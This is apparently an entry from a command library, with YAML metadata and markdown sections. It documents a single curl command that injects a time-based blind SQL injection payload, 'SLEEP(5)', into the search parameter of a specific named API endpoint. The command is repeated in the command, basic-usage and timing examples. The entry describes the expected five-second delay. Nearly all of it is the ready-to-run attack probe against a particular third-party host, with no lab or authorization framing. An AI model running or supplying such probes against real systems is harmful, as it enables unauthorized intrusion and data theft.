---
id: uuid-curl-payload
data: >-
  curl
  "https://docs.atavist.com/reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0'%20AND%20SLEEP(5)%20AND%20'wRIg'%20LIKE%20'wRIg'&sort="
tags:
  - sqli
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.911Z'
verified: false
validated: true
submitted: true
---
# curl-sleep-payload

## Command

```bash
curl "https://docs.atavist.com/reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0'%20AND%20SLEEP(5)%20AND%20'wRIg'%20LIKE%20'wRIg'&sort="
```

## Description

Injects a time-based SQL payload into the search parameter to test for blind SQL injection by observing response delays.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Endpoint with encoded SQL payload | Yes |

## Examples

### Basic Usage

```bash
curl "https://docs.atavist.com/reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0'%20AND%20SLEEP(5)%20AND%20'wRIg'%20LIKE%20'wRIg'&sort="
```

### Advanced Usage

With timing: time the command to measure delay.

```bash
time curl "https://docs.atavist.com/reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0'%20AND%20SLEEP(5)%20AND%20'wRIg'%20LIKE%20'wRIg'&sort="
```

## Expected Output

JSON response similar to baseline, but delayed by 5 seconds due to SLEEP(5).

## Related

- [[commands/curl-api-test]]
